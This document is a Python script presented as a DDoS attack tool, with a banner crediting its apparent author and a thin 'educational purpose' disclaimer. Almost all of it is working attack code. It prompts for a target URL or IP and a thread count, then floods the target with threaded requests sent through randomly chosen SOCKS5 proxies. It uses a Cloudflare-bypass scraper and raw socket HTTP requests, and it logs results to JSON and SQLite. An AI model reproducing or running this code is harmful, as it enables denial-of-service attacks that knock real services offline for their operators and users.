import socket
import os
import requests
import sys
import time
from time import sleep
from threading import Thread
import cfscrape
import random
import httpx
import socks
import sqlite3
import json
from colorama import Style, Fore, Back, init
from termcolor import colored
os.system("clear")

init()

R = "\033[91;1m"  # Red
G = "\033[92;1m"  # Green
B = "\033[94;1m"  # Blue
Y = "\033[93;1m"  # Yellow
C = "\033[96;1m"  # Cyan
M = "\033[95;1m"  # Magenta
W = "\033[97;1m"  # White
D = "\033[90;1m"  # Grey

sign = f"{G}[{B}*{G}]{B}"
Enter = f"{B}[{G}+{B}]{G}"
ERROR = f"{Y}[{R}!{Y}]{R}"

if os.geteuid() != 0:
    red_sudo = "\033[1;31m" + "sudo" + "\033[0m"
    print(f"{ERROR} {Style.RESET_ALL}please use {Y}root{Style.RESET_ALL} Type a command {red_sudo}")
    sys.exit(1)

def generate_activation_code():
    return ''.join(str(random.randint(0, 9)) for _ in range(3))

def display_code_for_10_seconds(activation_code):
    for remaining_seconds in range(10, 0, -1):
        print(f"{sign}Your activation code: {activation_code}{W}")
        print_colorized_time(remaining_seconds)
        time.sleep(1)
        clear_screen()
    print(f"{sign} Activation code expired Please enter your code.{W}")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_colorized_time(remaining_seconds):
    if remaining_seconds >= 7:
        color = f'{G}'
    elif 4 <= remaining_seconds <= 6:
        color = f'{Y}'
    else:
        color = f'{R}' 
    
    print(f"{color}[*] Time remaining: {remaining_seconds} seconds", end='\r')

def main():
    activation_code = generate_activation_code()
    display_code_for_10_seconds(activation_code)

    user_input = input(f"{B}[{G}+{B}] {M}Enter activation code: {Y}")
    
    if user_input == activation_code:
        print(f"{sign} Activation successful You can now proceed.{W}")
    else:
        print(f"{Y}[{R} ERROR{Y}]{R} Incorrect activation code. Exiting...{W}")
        sys.exit()

if __name__ == "__main__":
    main()

def spin():
    delay = 0.25
    spinner = ['█■■■■', '■█■■■', '■■█■■', '■■■█■', '■■■■█']

    for _ in range(1):
        for i in spinner:
            message = f"[*] {B}Checking your internet connection...[{i}]{W}"
            colored_message = colored(message, 'blue', attrs=['bold'])
            sys.stdout.write(f"\r{colored_message}   ")
            sys.stdout.flush()
            time.sleep(delay)

    sys.stdout.write("\r")
    sys.stdout.flush()
    done_message = colored("[+] Your Internet connection has been verified", 'yellow', attrs=['bold'])
    sys.stdout.write("\033[K") 
    print(done_message)
    time.sleep(1)

spin()

def check_internet_connection():
    try:
        response = requests.get('http://www.google.com', timeout=5)
        return True
    except requests.ConnectionError:
        return False

if check_internet_connection():
    print(f"{G}[*] Internet connection is available. You can proceed with execution.{W}")
    time.sleep(0.25)
else:
    print(f"{ERROR} No internet connection !{W}")
    exit()

attacks_data = []

def save_attack_data_to_json(attacks_data):
    with open("attacks.json", "w") as json_file:
        json.dump(attacks_data, json_file)

def save_attack_data_to_db(attacks_data):
    db_conn = sqlite3.connect("attacks.db")
    db_cursor = db_conn.cursor()
    db_cursor.execute("CREATE TABLE IF NOT EXISTS attacks (id INTEGER PRIMARY KEY AUTOINCREMENT, host TEXT, status_code INTEGER)")

    for data in attacks_data:
        db_cursor.execute("INSERT INTO attacks (host, status_code) VALUES (?, ?)", (data["host"], data["status_code"]))

    db_conn.commit()
    db_conn.close()

user = open("Attack-users.txt", "r").read().splitlines()
proxy = open("proxy.txt", "r").read().splitlines()
os.system("clear")

def wait_with_spinner(seconds, colors):
    symbols = "/-|\\"

    for _ in range(int(seconds)):
        for symbol in symbols:
            random_color = random.choice(colors)
            colored_symbol = f"{random_color}{symbol}"
            sys.stdout.write(f"\r{sign} Please wait....! {colored_symbol}  ")
            sys.stdout.flush()
            time.sleep(0.25)

    sys.stdout.write("\r" + " " * 30 + "\r")

wait_time = 2.5
colors = [G, R, B, Y, C, M, W, D]
wait_with_spinner(wait_time, colors)

input(f'''{Y}[+]{R} Warning:- {W}The tool {R}[DDoS Attack]{W} is for educational purpose I am not responsible for any wrongdoing If you agree press {G}[Enter]{W}\n''')

os.system("clear")

print(fr'''{Y}
       {Y}.---.        .-----------{W}  
      {Y}/     \  __  /    ------{W}    
     {Y}/ /     \(  )/    -----{W}     
    {Y}//////   ' \/ `   ---{W}    ____  ____          ____       _   _   _             _    
   {Y}//// / // :    : ---{W}     |  _ \|  _ \   ___  / ___|     / \ | |_| |_ __ _  ___| | __
  {Y}// /   /  /`    '--{W}       | | | | | | | / {R}_{W} \ \___ \    / _ \| __| __/ _` |/ __| |/ /
 {Y}//          //..\\{W}         | |_| | |_| || {R}(0){W} | ___) |  / ___ \ |_| || (_| | (__|   < 
        {Y}====UU====UU===={W}    |____/|____/  \_{R}^{W}_/ |____/  /_/   \_\__|\__\__,_|\___|_|\_\
            {Y}'//||\\`{W}              
              {Y}''`` {W}

{R}+------------------------------------------------------------------+
{R}|{G} GitHub{W} : {B}MohmmadALbaqer {W}|{Y} https://www.github.com/MohmmadALbaqer/ {R}|
{R}|{G} Instagram{W} :{B} r94xs {W}      |{Y} https://www.instagram.com/r94xs/       {R}|
{R}+------------------------------------------------------------------+{W}''')

text = f"{sign} For more write a command{W} \"{Y}[help{Y}]{W}\"" 

print(f"{sign} if exit press {Y}[Ctrl {W}+{Y} C]{W} to Exit.{W}")

start_index = text.find("help")
if start_index != -1:
    end_index = start_index + len("help")
    colored_text = text[:start_index] + colored(text[start_index:end_index], "yellow") + text[end_index:]
    print(colored_text)
else:
    print(text)
    
while True:
    cmd = input(colored(f'''
{W}┌──-[~/{R}D{G}D{B}o{Y}S{W}]
{W}└─{R}>{G}>{B}> {Y}'''))

    if cmd == "help":
        def print_menu():
            init()

        ascii_art = f"""
{M}
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |  {Y}OPTIONS{M}        |  |  |     | -==----'|      |
     |  |  {R}[+]{Y} {B}DNS{M}        |  |  |     |         |      |
     |  |  {R}[+]{Y} {B}cf{M}         |  |  |/----|`---=    |      |
     |  |  {R}[+]{Y} {B}HTTP{M}       |  |  |     |         |      |
     |  |  {R}[+]{Y} {B}socks{M}      |  |  |   ,/|==== ooo |      ;
     |  |  {R}[+]{Y} {B}TS3{M}        |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \\,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\\--{{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'
        {W}"""
        print(ascii_art)

        print_menu()
    elif cmd == "TS3":        
         print(f'''{B}                                     
  ________________
 /_  __/ ___/__  /
  / /  \__ \ /_ < 
 / /  ___/ /__/ / 
/_/  /____/____/  

{Back.RED}{W} Voice communication software aims to block communications or send false communications. {Style.RESET_ALL}''')
         print(1*"\n")
         host = input(f"{Enter} Url For Attack: {Y}")
         num = int(input(f"{Enter} Enter thread: {Y}"))
         print(f"{sign} if exit press {Y}[Ctrl {W}+{Y} C]{W}to Exit.{W}")
         break
    elif cmd == "DNS":
         print(f'''{B}
    ____  _   _______
   / __ \/ | / / ___/
  / / / /  |/ /\__ \ 
 / /_/ / /|  /___/ / 
/_____/_/ |_//____/  

{Back.RED}{W}  It targets the service of converting names to IP addresses. {Style.RESET_ALL}''')
         print(1*"\n")
         host = input(f"{Enter} Url For Attack: {Y}")
         num = int(input(f"{Enter} Enter thread: {Y}"))
         print(f"{sign} if exit press {Y}[Ctrl {W}+{Y} C]{W}to Exit.{W}")
         break
    elif cmd == "cf":
        print(fr'''

                                       {B}.{W}
   ____ _                   _   _____ {B}/ \{W}                   
  / ___| |  ___   _   _  __| | |  ___|{B}| |{W}  __ _ _ __ ___ 
 | |   | | / {R}_{W} \ | | | |/ _` | | |_   {B}|.|{W} / _` | '__/ _ \
 | |___| || {R}(0){W} || |_| | (_| | |  _|  {B}|.|{W}| (_| | | |  __/
  \____|_| \_{R}^{W}_/  \__,_|\__,_| |_|    {B}|:|{W} \__,_|_|  \___|
                                      {B}|:|{W}                    
                                  {W}~{Y}\===8===/{W}~{R}  
                                       8
                                       0

{Back.RED}{W}  It targets content filtering services that generate huge traffic. {Style.RESET_ALL}''')
        print(1*"\n")
        host = input(f"{Fore.GREEN}[+] Url For Attack: {Y}")
        num = int(input(f"{Fore.GREEN}[+] Enter thread: {Y}"))
        print(f"{sign} if exit press {Y}[Ctrl {W}+{Y} C]{W}to Exit.{W}")
        break
    elif cmd == "HTTP":
        print(f'''{G}                 
 _____ _____ _____ _____ 
|  |  |_   _|_   _|  _  |
|     | | |   | | |   __|
|__|__| |_|   |_| |__|     
                                                                       
         
{Back.RED}{W} Targets a web service to increase traffic. {Style.RESET_ALL}''')
        print(1*"\n")
        host2 = input(f"{Fore.GREEN}[+] Url For Attack: {Y}")
        num2 = int(input(f"{Fore.GREEN}[+] Enter thread: {Y}"))
        print(f"{sign} if exit press {Y}[Ctrl {W}+{Y} C]{W}to Exit.{W}")
        break
    elif cmd == "socks":
        print(rf'''{Y}
                      __           
  ______ ____   ____ |  | __ ______
 /  ___// __ \_/ ___\|  |/ //  ___/
 \___ \(  \_\ )  \___|    \ \___ \ 
/____  \\____/ \___  /__|_ \____  \
     \/            \/     \/    \/ 
                                                     
{Back.RED}{W} The Socks protocol aims to increase traffic volume. {Style.RESET_ALL}''')
        print(1*"\n")
        host3 = input(f"{Enter} IP For Attack: {Y}")
        port = int(input(f"{Enter} Port for Attack {Y}Enter Your Custom 4-digit Port {G}[80-9999]: {M}"))
        num3 = int(input(f"{Enter} Enter thread: {Y}"))
        print(f"{sign} if exit press {Y}[Ctrl {W}+{Y} C]{W}to Exit.{W}")
        break
    else:
        print(f"{ERROR} Enter{R} [{Y}help{R}]{W} Please{W}")

def ddos(si):
    try:
        proxy2 = {
            "all://": "socks5://" + str(random.choice(proxy))
        }
        u = random.choice(user)
        sc = cfscrape.CloudflareScraper()
        cf = sc.get(host, headers={'Attack-users': u}, proxies=proxy2)
        print(f"{sign} Send Packet FROME {Y}"+random.choice(proxy)+f"{M} TO {Y}"+host+f"{W}:{G}"+str(cf.status_code))
        attacks_data.append({"host": host, "status_code": cf.status_code})

        save_attack_data_to_json(attacks_data)
        save_attack_data_to_db(attacks_data)

        return True
    except:
        print(f"{ERROR} Not Connect error !{W}")

def http(nurt):
	try:
		proxy3={
			"all://":"socks5://"+str(random.choice(proxy))
			
			}
		with httpx.Client(proxies=proxy3) as client:
			r =client.head(host2,headers={'Attack-users':random.choice(user)})
			print(f"{sign} Send Packet OF the response:{W}"+str(r.status_code))
	except:
		print(f"{ERROR} connect time out !{W}")
def sock3(xl):
	
	for n3 in range(0, num3):
		sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((host3,port))
		ag1=random.choice(user)
		data=f"GET / HTTP/1.1\r\nHost:"+host3+"\r\nAttack-users:"+ ag1+"\r\n\r\n"
		sock.send(data.encode())
		print(f"{sign} Send Packet with IP{W}:"+"test"+"to the Target:"+host3)

if cmd=="HTTP":
	for z in range(0, num2):
		new_thread2 = Thread(target=http,args=(10,))
		new_thread2.start()
elif cmd=="socks":
	new_thread3 = Thread(target=sock3,args=(10,))
	new_thread3.start()
else:
	print(f"{ERROR} Not Founds {W}")

threads = []
for si in range(0, num):
	t1 = Thread(target=ddos, args=(si,))
	t1.start()
	threads.append(t1)
for t1 in threads:
	t1.join()	
      
save_attack_data_to_json(attacks_data)
save_attack_data_to_db(attacks_data)
